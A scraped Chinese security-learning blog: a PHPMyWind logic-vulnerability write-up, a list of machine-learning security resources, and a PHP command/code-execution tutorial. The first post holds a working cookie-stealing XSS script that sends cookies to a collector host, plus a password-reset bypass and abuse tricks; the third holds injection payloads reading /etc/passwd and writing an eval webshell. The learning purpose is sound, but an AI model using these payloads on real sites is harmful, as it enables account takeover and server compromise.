其中“ReflectiveXSS.js”用于针对服务器端PHPMyWind网站的反射型XSS漏洞窃取受害者victim的Cookie，并将该Cookie值传输给ReflectiveXSS.php；“ReflectiveXSS.php”用于接收名为“victimcookie”的GET请求，并将“victimcookie”的参数值保存到“cookie.txt”。 ReflectiveXSS.js的代码如下： 12345678//通过指定的名称&#x27;img&#x27;创建img元素var img = document.createElement(&#x27;img&#x27;);img.width = 0;img.height = 0;//将img元素的src属性指向脚本文件ReflectiveXSS.php//将cookie信息的字符串作为URI组件进行编码，然后用victimcookie参数传递img.src = &#x27;http://192.168.114.1/safedog-attack/ReflectiveXSS.php?victimcookie=&#x27;+encodeURIComponent(document.cookie); ReflectiveXSS.php的代码如下： 12345678910111213&lt;?php @ini_set(&#x27;display_errors&#x27;,1); $str = $_GET[&#x27;victimcookie&#x27;]; $filePath = &quot;cookie.txt&quot;; if(is_writable($filePath)==false)&#123; echo &quot;can&#x27;t write&quot;; &#125;else&#123; $handler = fopen($filePath, &#x27;a&#x27;); fwrite($handler, $str); fclose($handler); &#125;?&gt; 出发XSS漏洞的EXP： 1http:&#x2F;&#x2F;192.168.114.159&#x2F;phpmywind5-5&#x2F;data&#x2F;api&#x2F;oauth&#x2F;connect.php?method&#x3D;unknownmethod&lt;script src&#x3D;http:&#x2F;&#x2F;192.168.114.1&#x2F;safedog-attack&#x2F;ReflectiveXSS.js&gt;&lt;&#x2F;script&gt; 出现XSS漏洞的地方： 该漏洞出现的文件路径为：/data/api/oauth/connect.php，其中的代码段： 1234if(method_exists($connect, $method)) $connect-&gt;method();else echo &quot;请求的方法[&quot; . $method . &quot;不存在&quot;; if判断的作用是“判断函数名是否存在”，代码的逻辑是“如果函数名不存在，则在PHP页面输出函数名”，这一做法会造成反射型XSS漏洞。 任意密码重置 该漏洞出现的文件路径为：/member.php 123456789101112131415161718192021222324//检测旧密码是否正确if($password != &#x27;&#x27;)&#123; $oldpassword = md5(md5($oldpassword)); $r = $dosql-&gt;GetOne(&quot;SELECT `password` FROM `#@__member` WHERE `username`=&#x27;$c_uname&#x27;&quot;); if($r[&#x27;password&#x27;] != $oldpassword) &#123; ShowMsg(msg: &#x27;抱歉，旧密码错误！&#x27;, gourl: &#x27;-1&#x27;); exit(); &#125;&#125;$sql = &quot;UPDATE `#@__member` SET&quot;;if($password != &#x27;&#x27;)&#123; $password = md5(md5($password)); $sql .= &quot;password=&#x27;$password&#x27;,&quot;;&#125;@$sql .= &quot;question=&#x27;$question&#x27;, answer=&#x27;$answer&#x27;, cnname=&#x27;$cnname&#x27;, enname=&#x27;$enname&#x27;, sex=&#x27;$sex&#x27;, birthtype=&#x27;$birthtype&#x27;, birth_year=&#x27;$birth_year&#x27;, birth_month=&#x27;$birth_month&#x27;, birth_day=&#x27;$birth_day&#x27;, astro=&#x27;$astro&#x27;, bloodtype=&#x27;$bloodtype&#x27;, trade=&#x27;$trade&#x27;, live_prov=&#x27;$live_prov&#x27;, live_city=&#x27;$live_city&#x27;, live_country=&#x27;$live_country&#x27;, home_prov=&#x27;$home_prov&#x27;, home_city=&#x27;$home_city&#x27;, home_country=&#x27;$home_country&#x27;, cardtype=&#x27;$cardtype&#x27;, cardnum=&#x27;$cardnum&#x27;, intro=&#x27;$intro&#x27;, email=&#x27;$email&#x27;, qqnum=&#x27;$qqnum&#x27;, mobile=&#x27;$mobile&#x27;, telephone=&#x27;$telephone&#x27;, address_prov=&#x27;$address_prov&#x27;, address_city=&#x27;$address_city&#x27;, address_country=&#x27;$address_country&#x27;, address=&#x27;$address&#x27;, zipcode=&#x27;$zipcode&#x27; WHERE id=&#x27;$id&#x27; AND `username`=&#x27;$c_uname&#x27;&quot;;if($dosql-&gt;ExecNoneQuery($sql))&#123; ShowMsg(msg: &#x27;资料更新成功&#x27;, gourl: &#x27;?c=edit&#x27;); exit();&#125; 第一个if判断的作用是“判断用户提交的新密码是否为空”，在用户提交的新密码不为空的情况下，才会进行‘旧密码的比对’，如果提交的旧密码和数据库的查询结果不一致，则不允许继续进行更换密码的操作。第二个if判断的作用仍为“判断用户提交的新密码是否为空”，在用户提交的新密码不为空的情况下，对新密码进行哈希运算，随后进行SQL语句的拼接。这两个if语句存在了逻辑漏洞。因为，如果我们提交的新密码（password变量和repassword变量）为空，则可以绕过对旧密码（oldpassword变量）的验证。 在这里之所以要使用XSS获取cookie，是因为当SQL语句满足条件id='$id' AND username ='$c_uname';时，才可进行update操作。变量c_uname值（明文）来源于AuthCode($_COOKIE['username'])，即先取得Cookie中username(密文)的值，然后通过AuthCode函数配合配置文件中的密钥来获取明文。 PHPMyWind采用Cookie保存混淆化的用户登录信息。因为配置文件中的密钥是在CMS搭建时随机生成的，算法也不可逆，因此要在知道c_name变量的前提下，从正向伪造username等变量，以通过权限验证具有较大难度。为获取Cookie中的username等值，可考虑借助反射型XSS漏洞。 其他实例 现在wooyun已经没了，只能在一些镜像网站看漏洞合集，以逻辑漏洞为关键词搜索到了186个相关漏洞，基本上把每个漏洞都过了一遍，也没办法复现，记录一些比较有代表性的案例，权当搜集思路吧。 支付业务相关逻辑漏洞 常见手法 修改金额； 修改商品数量； 修改优惠金额； 修改数量、单价，优惠价格参数为负数、小数，无限大； 商品价格更改； 支付key泄露等。 实际安全中会有一些比较特别的，反正各种能改的参数都去尝试。个数单价-优惠券个数单价=总额，每个值都可能存在问题，就看服务自身处理是否有问题了。 顺丰宝业务逻辑漏洞：数量和金额没有做签名 移动手机支付业务逻辑漏洞：爆破四位验证码 新东方逻辑支付漏洞：修改运费金额为负数，使得课程金额+运费大于0即可 中国零食网支付逻辑漏洞：同上 阿里云计算按量付费逻辑漏洞一枚（低价享受超级主机）：经过base64编码的数据可以被篡改，并且后端会接受篡改的数据 乐视商城支付逻辑漏洞（价格可更改）：价格参数明文显示在url，可以直接更改 再次挖掘乐视商城支付逻辑漏洞：同上 读览天下支付逻辑漏洞可刷充值金额：替换支付订单号 益盟爱炒股商城支付逻辑漏洞：修改Cookie中的参数值 饿了么逻辑漏洞之免费吃喝不是梦：手机号+;+手机号绕过服务器对手机号码的次数限制 七夕单身专场之性多多免费刷成人用品(支付逻辑漏洞)：改负数刷代币 大疆某处支付逻辑漏洞可1元买无人机：https改为http访问，修改支付的参数 密码找回相关逻辑漏洞 常见手法 找回密码的验证码为四位数字可爆破真实验证码； 采用本地验证,可以先尝试修改自己的帐号密码，保存正确的返回包，然后修改他人密码的时候替换返回包； 最终修改密码的数据包，以另外的ID作为身份判断（例如userid），而该ID在别处可以获取到； 接受验证码的手机号修改为自己的号码，然后输入自己的号码接收到的验证码去进行密码重置； 获取验证码的时候，会生成一个身份标识（例如cookie值），那么我们就替换他人账号的身份证重置他人的密码； 具体可以去i春秋看carry_your发过的一篇专门针对密码重置的视频。 用户凭证暴力破解 四位或者六位的纯数字 WooYun: 当当网任意用户密码修改漏洞 WooYun: 微信任意用户密码修改漏洞 返回凭证 url返回验证码及token WooYun: 走秀网秀团任意密码修改缺陷 WooYun: 天天网任意账户密码重置（二） 密码找回凭证在页面中 通过密保问题找回密码 WooYun: sohu邮箱任意用户密码重置 返回短信验证码 WooYun: 新浪某站任意用户密码修改（验证码与取回逻辑设计不当） 邮箱弱token 时间戳的md5 WooYun: 奇虎360任意用户密码修改漏洞 用户名 &amp; 服务器时间 WooYun: 中兴某网站任意用户密码重置漏洞（经典设计缺陷案例） 用户凭证有效性 短信验证码 WooYun: OPPO手机重置任意账户密码（3） WooYun: 第二次重置OPPO手机官网任意账户密码（秒改） WooYun: OPPO修改任意帐号密码 邮箱token WooYun: 身份通任意密码修改-泄漏大量公民信息 重置密码token WooYun: 魅族的账号系统内存在漏洞可导致任意账户的密码重置 重新绑定 WooYun: 网易邮箱可直接修改其他用户密码 WooYun: 如家酒店某严重逻辑漏洞可登陆任意账号可导致几千万敏感信息泄露（涉及任意用户账号个人基本信息、入住记录等） Wooyun: 华住酒店官网某严重逻辑漏洞可登陆任意账号（涉及任意用户账号个人基本信息、入住记录等） WooYun: 12308可修改任意用户密码 邮箱绑定 WooYun: 某彩票设计缺陷可修改任意用户密码 WooYun: 中国工控网任意用户密码重置漏洞 服务器验证 WooYun: 携程旅行网任意老板密码修改(庆在wooyun第100洞) 服务器验证可控内容 WooYun: AA拼车网之任意密码找回2 WooYun: 四川我要去哪517旅行网重置任意账号密码漏洞 服务器验证验证逻辑为空 WooYun: 某政企使用邮件系统疑似存在通用设计问题 用户身份验证 账号与手机号码的绑定 WooYun: 上海电信通行证任意密码重置 账号与邮箱账号的绑定 WooYun: 魅族的账号系统内存在漏洞可导致任意账户的密码重置 WooYun: 和讯网修改任意用户密码漏洞 找回步骤 跳过验证步骤、找回方式，直接到设置新密码页面 WooYun: OPPO手机同步密码随意修改，短信通讯录随意查看 WooYun: 中国电信某IDC机房信息安全管理系统设计缺陷致使系统沦陷 本地验证 在本地验证服务器的返回信息，确定是否执行重置密码，但是其返回信息是可控的内容，或者可以得到的内容 WooYun: 看我如何重置乐峰网供应商管理系统任意用户密码（管理员已被重置） WooYun: oppo重置任意用户密码漏洞(4) 发送短信等验证信息的动作在本地进行，可以通过修改返回包进行控制 WooYun: OPPO修改任意帐号密码-3 WooYun: OPPO修改任意帐号密码-2 注入 在找回密码处存在注入漏洞 WooYun: 用友人力资源管理软件（e-HR）另一处SQL注入漏洞（通杀所有版本） Token生成 token生成可控 WooYun: 天天网任意账号密码重置(非暴力温柔修改) WooYun: 天天网再一次重置任意账号密码(依旧非暴力) 注册覆盖 注册重复的用户名 WooYun: 中铁快运奇葩方式重置任意用户密码(admin用户演示) session覆盖 WooYun: 聚美优品任意修改用户密码(非爆破) 越权相关逻辑漏洞 越权漏洞是Web应用程序中一种常见的安全漏洞。它的威胁在于一个账户即可控制全站用户数据。当然这些数据仅限于存在漏洞功能对应的数据。越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定。所以测试越权就是和开发人员拼细心的过程。 常见手法 操作时分析请求中的数据包，看看每个参数的作用，修改参数查看变化。 拥有更多权限的账号，把能访问的URL都提取出来，给低权限用户访问或者直接访问，查看能否访问。 猜测隐藏的API，如:guest/getorder，修改成admin/getorder。 通过搜索引擎，或者提取JS中的URL，查找隐藏功能。如burpsuite中有一个BHP JS scraper的插件。 猜测隐藏的参数，添加进去查看变化，如修改信息的时候加个ID。 抓取所有的数据包，搜索用户名等关键词，比如我的用户名是test，在burpsuite中的HTTP history搜索test，看看有没有哪个数据包包含这个参数,将其修改为其他的用户名，查看变化。 JSRC——越权漏洞挖掘 JSRC——聊聊越权那些事 我的越权之道 垂直越权的手法： 编辑个人信息的时候，修改权限组的id，一般管理员的值为0或者1； 后台修改密码的地方，如果是根据userid来修改密码的，可以修改id的值来修改管理员的密码； 在个人资料处插入XSS脚本，一般能打到管理员cookie的概率很大； 查看个人资料的时候，如果是根据id来显示，一般都有越权，可以遍历id获取管理员信息； 测试后台功能，找一下注入、上传、命令执行等漏洞，直接拿下数据库权限或者shell，再找管理员权限就轻而易举了。 其他资料 业务逻辑漏洞总结 JSRC——业务逻辑漏洞挖掘 JSRC——交易支付漏洞挖掘 JSRC——Web漏洞之逻辑漏洞挖掘 JSRC——批量Web漏洞挖掘 Reference [红日安全]Web安全Day6 - 业务逻辑漏洞实战攻防 密码找回逻辑漏洞总结","tags":[{"name":"web安全学习","slug":"web安全学习","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"},{"name":"逻辑漏洞","slug":"逻辑漏洞","permalink":"http://ca0y1h.top/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"机器学习与网络安全相关的资料（转）","date":"2020-01-17T02:49:44.000Z","path":"Machine_learning/机器学习与网络安全相关的资料（转）/","text":"机器学习与网络安全相关的资料（转） 外媒 KDnuggets 刊登了一篇机器学习与网络安全相关的资料大汇总，文中列出了相关数据源的获取途径，优秀的论文和书籍，以及丰富的教程。大部分都是作者在日常工作和学习中亲自使用并认为值得安利的纯干货。 数据源 SecRepo.com 网站，该网站汇聚了大量的与机器学习和网络安全相关的数据源，并提供免费下载。据网站首页介绍，所有可用的数据源包含两个部分：一是网站方面自己整理的，二是来自第三方的。其内容包括互联网扫描数据，恶意软件源码，以及和网络安全相关的系统日志等。 论文 1. Fast, Lean, and Accurate: Modeling Password Guessability Using Neural Networks 本文来自卡内基梅隆大学，分析了通用符号密码的脆弱性，以及目前常见的密码健壮性检验的各种缺点，甚至给出了他们在实验室利用神经网络算法攻破各种符号密码的具体步骤，非常强大。 2. Outside the Closed World: On Using Machine Learning for Network Intrusion Detection 本文来自加州伯克利大学，分析了利用机器学习探测网络安全的优势和劣势，并给出了一些改善这些劣势的解决方案。 3. Anomalous Payload-Based Network Intrusion Detection 通常一个互联网上的恶意请求都会在真正的恶意代码外部包装一层善意的外衣，这大大阻碍了相关探测程序的正常工作。来自哥伦比亚大学的Ke Wang和Salvatore J. Stolfo两位学者在本文中给出了一种全新的探测恶意代码中有效代码段的方法，并在实测中达到了接近100%正确率和0.1%的误报率。 4. Malicious PDF detection using metadata and structural features 当前，随着防范措施的升级，恶意代码隐藏在PDF和Word等文本文件中的例子屡见不鲜，用户防不胜防。在本文中，来自乔治梅森大学的学者介绍了一种通过机器学习技术探测恶意文本文件的技术，特别是内含恶意代码的PDF文件。 5. Adversarial support vector machine learning 来自德州大学，介绍了两种利用机器学习技术探测网络恶意攻击的分析模型，即无边界攻击模型（free-range attack model）和限制边界攻击模型（restrained attack model）。 6. Exploiting machine learning to subvert your spam filter 垃圾邮件过滤系统不算什么高新技术，但如何提升过滤的准确性一直是一个难题。本文中来自加州伯克利大学的学者们介绍了一种基于机器学习开发的垃圾邮件过滤器，为垃圾邮件的过滤提供了一种全新的实现思路。 以下论文来自 covert.io 网站，该网站的论文（或博客）数量庞大，但并不像上文提到的那些论文一样全部来自美国高校，covert.io 的文章也来自各大科技公司和研究所。 [7. CAMP: Content-Agnostic Malware Protection](http://www.covert.io/research-papers/security/CAMP - Content Agnostic Malware Protection.pdf) 来自谷歌，介绍了一种名为CAMP的恶意软件保护系统，该系统能够通过对二进制可执行文件的探测，确保互联网的软件应用安全。 [8. Building a Dynamic Reputation System for DNS](http://www.covert.io/research-papers/security/Notos - Building a dynamic reputation system for dns.pdf) DNS服务器一直是互联网中非常重要的组成部分，针对目前越来越流行的DNS攻击，来自乔治亚理工学院的学者介绍了一种名为Notos的动态的域名信誉系统，可以有效防范各种针对DNS服务器的匿名的网络黑客攻击。 [9. Detecting malware domains at the upper dns hierarchy](http://www.covert.io/research-papers/security/Kopis - Detecting malware domains at the upper dns hierarchy.pdf) 本文介绍了一种名为Kopis的新型域名检测系统，可以有效探测互联网上包含恶意攻击代码的域名，由网络安全公司Damballa、乔治亚理工学院和乔治亚大学联合研发。 [10. From Throw-away Traffic To Bots – Detecting The Rise Of DGA-based Malware](http://www.covert.io/research-papers/security/From throw-away traffic to bots - detecting the rise of dga-based malware.pdf) 本文同样来自Damballa公司和乔治亚大学，介绍了一种针对僵尸网络的新技术，该技术够探测来自动态域名系统的恶意攻击，整合了聚合和分类两类算法。 [11. EXPOSURE: Finding Malicious Domains Using Passive DNS Analysis](http://www.covert.io/research-papers/security/Exposure - Finding malicious domains using passive dns analysis.pdf) DNS服务器成为了越来越多黑客的攻击对象，本文介绍了一种名为EXPOSURE的域名分析系统，可以针对大批量的域名恶意访问进行探测，由Eurecom研究所、波士顿东北大学和加州大学共同研发。 [12. Polonium: Tera-Scale Graph Mining for Malware Detection](http://www.covert.io/research-papers/security/Polonium - Tera-Scale Graph Mining for Malware Detection.pdf) 本文来自网络安全公司Symantec、卡内基梅隆大学，介绍了一个名为Polonium的高效的可扩展的恶意软件探测系统。 [13. Nazca: Detecting Malware Distribution in Large-Scale Networks](http://www.covert.io/research-papers/security/Nazca - Detecting Malware Distribution in Large-Scale Networks.pdf) 大量用户在现实生活中下载并安装恶意软件的行为通常包含一定的规律性。来自加州大学圣巴巴拉分校、Narus公司的学者们将这些无人问津的数据利用起来，提出了一个名为Nazca的网络安全探测系统。 [14. Anagram: A Content Anomaly Detector Resistant to Mimicry Attack](http://www.covert.io/research-papers/security/Anagram - A Content Anomaly Detector Resistant to Mimicry Attack.pdf) 来自哥伦比亚大学，介绍了一个名为Anagram的异常数据报文探测器。 书籍 讲述数据科学和机器学习在网络安全领域的应用的书籍并不多，作者只介绍了以下两本。 1. Data Mining and Machine Learning in Cybersecurity 作者是来自路易斯安那理工大学的Sumeet Dua博士和Xian Du博士，探讨了目前普遍存在的网络安全问题以及最先进的机器学习和数据挖掘解决方案。 2. Machine Learning and Data Mining for Computer Security 编者是来自乔治城大学的Marcus A. Maloof，该书系统介绍了数据挖掘和机器学习技术在计算机安全领域的最新研究成果。 目前两本书都没有中文版，纸质版在亚马逊上的售价都超过1000人民币，第一本有Kindle电子版。 演讲 原文作者收集了如下一些关于机器学习和网络安全的演讲，演讲者们要么是来自相关领域的公司副总、技术负责人，要么是各大高校的研究人员、博士或者教授。 1. Using Machine Learning to Support Information Security 视频系统介绍了机器学习在信息安全领域的应用，时长约1小时。 2. Defending Networks with Incomplete Information 要在限定的时间内（通常是24小时）对恶意攻击做出反应通常需要耗费巨大的人力和物力，但是如果利用机器学习的方法，首先对网络攻击进行优先级和攻击方式分类，甚至处理一些简单的套路式的攻击，则可以大大降低网络安全工程师的工作强度。本视频就介绍了这一思路的具体应用，时长约47分钟。 3. Applying Machine Learning to Network Security Monitoring 这个视频介绍了如何将机器学习应用于网络安全探测，时长约1小时。 4. Measuring the IQ of your Threat Intelligence Feed 目前互联网上存在着各种各样的网络安全的探测系统，但是用户对它们褒贬不一，究竟如何判断一个探测系统的可靠性，视频介绍了一种实用的判断方法，时长约40分钟。 5. Data-Driven Threat Intelligence: Metrics On Indicator Dissemination And Sharing 视频介绍了数据驱动下的安全情报分析，特别是和社交网络分享和传播相关的，时长约48分钟。 6. Applied Machine Learning for Data Exfil and Other Fun Topics 为了帮助网络安全相关的研究者、分析师和极客爱好者了解机器学习，以及如何将机器学习应用在网络安全中领域中，例如数据泄露，本视频做了详细介绍，时长约43分钟。 7. Secure Because Math: A Deep-Dive on ML-Based Monitoring 视频介绍了以机器学习技术为基础的互联网监控，时长约46分钟。 8. Machine Duping 101: Pwning Deep Learning Systems 44分钟教你攻克一个深度学习系统，必看系列。 9. Weaponizing Data Science for Social Engineering 视频介绍了社交网络中的恶意攻击行为和数据科学对此可能发挥的作用，时长约44分钟。 10. Defeating Machine Learning What Your Security Vendor Is Not Telling You 还是关于攻破机器学习的话题，视频介绍了如何攻破以机器学习为基础的互联网安全产品，时长约50分钟。 11. CrowdSource: Crowd Trained Machine Learning Model for Malware Capability Det 视频介绍了如何利用机器学习模型来探测互联网安全，时长约28分钟。 12. Defeating Machine Learning: Systemic Deficiencies for Detecting Malware 系统的“缺陷”也能用来探测恶意软件？这个视频用45分钟为你详细讲解利用机器学习和系统“缺陷”来探测恶意软件的方法。 13. Packet Capture Village – Theodora Titonis – How Machine Learning Finds Malware 视频介绍了如何利用机器学习探测移动端恶意软件，时长约44分钟。 14. Build an Antivirus in 5 Min – Fresh Machine Learning 视频用5分钟介绍了如何用互联网上开源的机器学习框架编写一个全新的防病毒程序。 15. Hunting for Malware with Machine Learning 视频介绍了针对企业用户的自动化恶意软件探测系统，时长约48分钟。 项目和教程 1. Click Security Data Hacking Project 该项目包含了一系列与IPython、Pandas、Scikit Learn相关的练习，包含笔记和原代码，每个练习都会故意设置一些常见的代码错误、数据库错误和逻辑错误供使用者改正。该系列教程几乎是机器学习在信息安全领域应用的必学教程。 2. Using Neural Networks to generate human readable passwords 链接中是一位大神自己编写的一个基于Keras框架和python语言的密码生成器，利用了深度神经网络原理，在保证密码安全性的同时也保证了易读性。该项目的代码已经在Github上开源，可以结合上文提到的论文《Fast, Lean, and Accurate: Modeling Password Guessability Using Neural Networks》一起学习。 原代码：链接 3. Machine Learning based Password Strength Classification 该项目关于用机器学习算法判断一个已知密码的健壮性，代码已经在Github上开源。 源代码：链接 4. Using Machine Learning to Detect Malicious URLs 该项目关于如何利用机器学习探测恶意的互联网链接地址，据称可以达到98%的正确率。 源代码：链接 5. Big Data and Data Science for Security and Fraud Detection 这是一篇综述文章，文中介绍了多个国家/地区/大公司正在使用或研发的大数据分析工具和技术，这些技术结合了文本挖掘、机器学习或者网络分析，能够在早期阶段对网络安全威胁进行检测和预防。 6. Using deep learning to break a Captcha system 这是一篇博客文章，介绍了如何利用深度学习技术破解烦人的验证码系统，作者在文中给出了部分关键功能模块的源代码，并且在文末还给出了许多参考链接。 7. Data Mining for Cyber Security 这是斯坦福大学开设的一个系列公开课，关于数据挖掘在互联网安全中的应用。在链接中可以直接看到课程安排，下载到讲师演讲的文本记录、PPT，查看课后作业的题目和此前同学上传的答案，以及课后的深入阅读列表。这一课程可能是数据科学目前在网络安全领域已经公开的最好的课程之一。 其他 1. System predicts 85 percent of cyber-attacks using input from human experts 这是一篇研究成果介绍的文章，介绍了来自MIT计算机科学与人工智能实验室（CSAIL）和一家机器学习初创公司PatternEx的最新研究成果：一个名为AI2的人工智能平台，能够根据人类网络安全专家输入的数据，对当前网络可能遭到的安全威胁做出预测，正确率高达85%，超越了目前已知的其他同类预测系统。文中通过文字和视频的方式讲解了这一预测系统的基本工作原理。 2. MLSec 这是一个开源项目相关的网站，该网站聚合了一系列将机器学习技术应用于网络安全领域的开源项目，同时还开设了博客文章和社区讨论频道，帮助开发者对这些项目深入理解。 3. An Introduction to Machine Learning for Cybersecurity and Threat Hunting 这是一篇深度文章，通过与几位数据科学大牛访谈的形式，详细介绍了机器学习和网络安全的关系以及相关应用。 以上只是这位外国大牛的总结，如果你手里也有一些值得安利的干货和资源，不妨在文末留言分享出来吧！ 附原文作者简介：Faizan Ahmad，Fulbright 计划大学生，目前在巴基斯坦国立计算机与新兴科学大学（National University of Computer and Emerging ScienCES）学习，同时在巴基斯坦的拉合尔管理科学大学（Lahore University of Management Sciences）担任研究助理，主攻计算机和网络安全研究方向。 来源：kdnuggets","tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://ca0y1h.top/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8/"}],"categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://ca0y1h.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"网络安全","slug":"机器学习/网络安全","permalink":"http://ca0y1h.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"Web安全基础学习之命令执行漏洞利用","date":"2020-01-16T12:30:45.000Z","path":"Web_security/basic_learning/18.命令执行漏洞利用/","text":"Web安全基础学习之命令执行漏洞利用 命令执行漏洞的原理 应用程序有时需要调用一些执行系统命令的函数，比如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_open等函数可以执行系统命令。举个例子来说：后台代码这么写&lt;?php system($_GET['cmd']); ?&gt;，这里的cmd参数用户是可以控制的，那么我们就可以发送请求http://example.com/?cmd=ls来执行系统命令。 很多人喜欢把代码执行漏洞称为命令执行漏洞，因为命令执行漏洞可以执行系统命令，而代码执行漏洞也会执行系统命令，这样就比较容易混淆。它们之间的区别是：命令执行漏洞是直接调用操作系统命令，而代码执行漏洞则是靠执行代码脚本调用操作系统命令，比如：eval(system('set')) 命令执行漏洞的利用 利用条件： 代码中存在调用系统命令的函数，如exec、system等； 函数中存在我们可控的参数； 可控参数没有过滤或者过滤不严格。 比如下面的PHP代码段： 12345$uri = $request[&#x27;uri&#x27;];$from = $request[&#x27;from&#x27;];$to = $request[&#x27;to&#x27;];$tmp = &#x27;/tmp/act_css_tmp_&#x27;. $uri;system(&#x27;/usr/bin/wget $from -O $tmp&#x27;); $request变量来自用户URL的输入，最终进入到system函数里作为命令来执行，但是这段代码没有过滤用户的输入，所以可以通过如下的输入来利用命令执行漏洞： 1?cmd&#x3D;1190&amp;func&#x3D;sync_css&amp;uri&#x3D;hi&amp;from&#x3D;;cat &#x2F;etc&#x2F;passwd;&amp;to&#x3D;hi&amp;1&#x3D;2 命令执行漏洞可以有如下的利用： 存在回显的话，可以直接读入各种配置文件，密码文件，数据库连接文件等等； 不存在回显的时候，可以使用时间延迟推断，类似盲注的方法。通过一些命令的延时作用来判断漏洞的存在，例如ping命令； 不能在浏览器直接看到回显，可将命令重定向到当前目录下的文件中并查看。或者用TFTP上传工具到服务器，用telnet和netcat建立反向shell，用mail通过SMTP发送结果； 查看自己的权限，可以提升权限，访问敏感数据或控制服务器。 命令执行漏洞可利用的函数 12345678system()exec()shell_exec()passthru()pcntl_exec()popen()proc_open()反引号 反引号 反引用的本质就是在操作系统执行该命令，此时可以造成命令注入等各种危害。 123456[root@ca0y1h-centos ~]# echo lsls[root@ca0y1h-centos ~]# `echo ls`vulhub-master[root@ca0y1h-centos ~]# lsvulhub-master exec()/shell_exec()/passthru() 1234567string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )string shell_exec ( string $cmd )string escapeshellcmd ( string $command )void passthru ( string $command [, int &amp;$return_var ] ) 这几个就不细说的，读名字都知道是执行shell命令,如果函数执行未过滤完善的可控参数，可以执行系统命令。 popen()/proc_open()/pcntl_exec() 12345resource popen ( string $command , string $mode )resource proc_open ( string $cmd , array $descriptorspec , array &amp;$pipes [, string $cwd [, array $env [, array $other_options ]]] )void pcntl_exec ( string $path [, array $args [, array $envs ]] ) 其中popen()和proc_open()是不会直接返回执行结果的，而是返回一个文件指针，但是命令是已经执行了 代码执行漏洞可利用的函数 1234567891011eval()assert()preg_replace()create_function()call_user_func()ob_start() eval()函数 eval() 函数把字符串按照 PHP 代码来计算。 该字符串必须是合法的 PHP 代码，且必须以分号结尾。 如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。 比如： 1234&lt;?php $str = @(string)$_GET[&#x27;str&#x27;]; eval(&#x27;$str=&#x27;&quot;.addslashes($str).&quot;&#x27;;&#x27;);?&gt; 利用方式： 1index.php?str&#x3D;$&#123;$&#123;phpinfo();&#125;&#125; 那么根据上面绕过过滤的方式我们就可以这样写入一句话代码了。 1index.php?str&#x3D;$&#123;$&#123;fputs(fopen(&#39;test.php&#39;,&#39;w+&#39;),&#39;&lt;?php @eval(\\$_POST[&#39;test&#39;])?&gt;&#39;)&#125;&#125; assert()函数 示例代码： 1234&lt;?php $a = $_GET[&#x27;a&#x27;]; assert($a);?&gt; 利用方式： 123http:&#x2F;&#x2F;127.0.0.1&#x2F;oscommand&#x2F;1.php?a&#x3D;phpinfo();或http:&#x2F;&#x2F;127.0.0.1&#x2F;oscommand&#x2F;1.php?a&#x3D;phpinfo() eval()和assert()区别 eval()函数正确执行需要满足php的代码规范，而assert()函数则不存在这个问题，对于php的代码规范要求不高 preg_replace()函数 示例代码： 123&lt;?php preg_replace(&quot;//e&quot;, $GET[&#x27;test&#x27;], &quot;test...&quot;);?&gt; 当replacement 参数构成一个合理的php 代码字符串的时候，/e 修正符使preg_replace()，将replacement 参数当做php 代码执行。 案例：X7 Chat 2.0.5 preg_replace() PHP Code Execution create_function()函数 在php 中使用create_function()创建一个匿名函数（lambda-style）,如果对参数未进行严格的过滤审查，攻击者可以通过提交特殊字符串给create_function()从而导致任意代码执行。 示例代码： 12345678&lt;?phperror_reporting(0);$sort_by = $_GET[&#x27;sort_by&#x27;];$sorter = &#x27;strnatcasecmp&#x27;;$databases=array(&#x27;1234&#x27;,&#x27;4321&#x27;);$sort_function = &#x27; return 1 * &#x27; . $sorter . &#x27;($a[&quot;&#x27; . $sort_by . &#x27;&quot;], $b[&quot;&#x27; . $sort_by . &#x27;&quot;]);&#x27;;usort($databases, create_function(‘$a, $b’, $sort_function));?&gt; 首先构造出函数原型： 123function test($a,$b)&#123; return 1 * &#x27; . $sorter . &#x27;($a[&quot;&#x27; . $sort_by . &#x27;&quot;], $b[&quot;&#x27; . $sort_by . &#x27;&quot;]);&#125; 根据这个，我们可以构造payload: 1?sort_by&#x3D;”]);&#125;phpinfo();&#x2F;* 传入后得到： 1return 1 * strnatcasecmp($a[&quot;&quot;]);&#125;phpinfo();&#x2F;*”], $b[&quot;&quot;]);&#125;phpinfo();&#x2F;*”]); 很显然，经过/*注释符 我们剩下的只有： 123function test($a,$b)&#123;return 1 * strnatcasecmp($a[&quot;&quot;]);&#125;phpinfo(); 案例：WordPress &lt;= 4.6.1 使用语言文件任意代码执行 call_user_func()函数 call_user_func(callable parameter [, mixed $… ]])把第一个参数作为回调函数调用。 示例代码： 123&lt;?php call_user_func($_GET[&#x27;a&#x27;],$_GET[&#x27;b&#x27;]);?&gt; 利用方式： 1index.php?a&#x3D;assert&amp;b&#x3D;phpinfo() ob_start() bool ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] ) 函数描述：此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。 内部缓冲区的内容可以用 ob_get_contents() 函数复制到一个字符串变量中。 想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。另外， 使用 ob_end_clean() 函数会静默丢弃掉缓冲区的内容。 